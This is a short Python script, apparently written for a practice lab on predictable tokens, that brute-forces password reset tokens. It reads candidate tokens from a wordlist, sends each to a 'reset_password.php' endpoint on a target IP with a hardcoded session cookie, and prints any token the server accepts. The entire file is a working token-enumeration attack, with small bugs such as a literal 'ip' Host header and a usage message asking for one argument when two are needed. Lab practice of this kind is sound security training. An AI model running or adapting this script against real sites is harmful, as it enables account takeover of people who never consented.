import requests
import sys

def check_valid_password_reset_tokens(token, ip):
    url = f"http://{ip}/labs/predictable_tokens/reset_password.php?token={token}"
    headers = {
      "Host": f"ip",
      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Accept-Encoding": "gzip, deflate",
      "Connection": "keep-alive",
      "Cookie": "PHPSESSID=340vnk81a3u3d2d24qqr6mo39k",
      "Upgrade-Insecure-Requests": "1",
      "Priority": "u=0, i",
    }
    try:
       response = requests.get(url, headers=headers, timeout=5)
       return response.text
    except requests.exceptions.RequestException as e:
           print(e)
           return None

def enumeration_tokens(tokens_wordlist_path, ip):
    try:
       with open(tokens_wordlist_path, "r") as file:
            tokens  = [line.strip() for line in file if line.strip()]

       for token in tokens:
           body = check_valid_password_reset_tokens(token, ip)
           print(token)
           if body is None:
              print(f"Token error! {token}")
              continue
           if "Invalid token." not in body:
               print(f"{token}\n{body}")
    except Exception as error:
           print(error)
           
if __name__ == "__main__":
   if len(sys.argv) != 3:
      print(f"1 Argument needed: <wordlist_tokens.txt>")
      sys.exit(0)

   path_wordlist_tokens = sys.argv[1]
   ip = sys.argv[2]
   enumeration_tokens(path_wordlist_tokens, ip)
